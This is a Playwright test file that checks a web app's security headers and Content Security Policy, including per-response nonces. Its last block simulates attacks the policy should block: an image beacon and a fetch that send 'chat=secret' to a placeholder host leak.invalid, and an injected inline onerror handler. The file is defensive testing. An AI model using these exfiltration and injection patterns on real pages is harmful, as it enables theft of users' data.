import { contentSecurityPolicy } from "../src/start"
import type { Page } from "@playwright/test"

import { expect, test } from "./session"

// The security headers from src/start.ts, on a page and on /api, and what
// the browser does with the Content Security Policy. Every other spec
// checks the policy too: a page it blocks something on logs an error,
// which fails the test (e2e/session.ts).

const nonceOf = (policy: string | undefined) =>
  /'nonce-([^']+)'/.exec(policy ?? "")?.[1]

for (const path of ["/sign-in", "/api/auth/ok"]) {
  test(`${path} carries the security headers`, async ({ request }) => {
    const headers = (await request.get(path)).headers()
    expect(headers["x-frame-options"]).toBe("DENY")
    expect(headers["x-content-type-options"]).toBe("nosniff")
    expect(headers["referrer-policy"]).toBe("same-origin")
    const policy = headers["content-security-policy"]
    const nonce = nonceOf(policy)
    expect(nonce).toMatch(/^[A-Za-z0-9+/]{22}==$/)
    expect(policy).toBe(contentSecurityPolicy(nonce ?? ""))
  })
}

test("each response gets its own nonce", async ({ request }) => {
  const policy = async () =>
    (await request.get("/sign-in")).headers()["content-security-policy"]
  expect(nonceOf(await policy())).not.toBe(nonceOf(await policy()))
})

test("every script on a page carries the response's nonce", async ({
  page,
}) => {
  const response = await page.goto("/sign-in")
  const nonce = nonceOf(response?.headers()["content-security-policy"])
  // The browser hides a nonce from getAttribute, but not from .nonce.
  const nonces = await page
    .locator("script")
    .evaluateAll((scripts: HTMLScriptElement[]) =>
      scripts.map((script) => script.nonce)
    )
  expect(nonces.length).toBeGreaterThan(0)
  expect(new Set(nonces)).toEqual(new Set([nonce]))
})

test.describe(() => {
  // The browser logs what it blocks.
  test.use({ allowedProblems: [/Content Security Policy/] })

  /** What the page tries: something the policy should block. */
  type Attempt = "image" | "inline handler" | "fetch"

  /** The directive the policy blocks `attempt` with on /sign-in. */
  async function blockedBy(page: Page, attempt: Attempt) {
    await page.goto("/sign-in")
    return page.evaluate(
      (attempt) =>
        new Promise<string>((resolve) => {
          document.addEventListener(
            "securitypolicyviolation",
            (event) => resolve(event.effectiveDirective),
            { once: true }
          )
          if (attempt === "image") {
            const image = document.createElement("img")
            image.src = "https://leak.invalid/pixel.png?chat=secret"
            document.body.appendChild(image)
          } else if (attempt === "inline handler") {
            // As markup that slipped past the sanitizer would arrive.
            document.body.insertAdjacentHTML(
              "beforeend",
              '<img src="/missing" onerror="window.ran = true">'
            )
          } else {
            void fetch("https://leak.invalid/?chat=secret").catch(
              () => undefined
            )
          }
        }),
      attempt
    )
  }

  test("a page won't load an image from another site", async ({ page }) => {
    expect(await blockedBy(page, "image")).toBe("img-src")
  })

  test("a page won't run a script it didn't send", async ({ page }) => {
    expect(await blockedBy(page, "inline handler")).toBe("script-src-attr")
    expect(await page.evaluate(() => "ran" in window)).toBe(false)
  })

  test("a page won't connect to another site", async ({ page }) => {
    expect(await blockedBy(page, "fetch")).toBe("connect-src")
  })
})
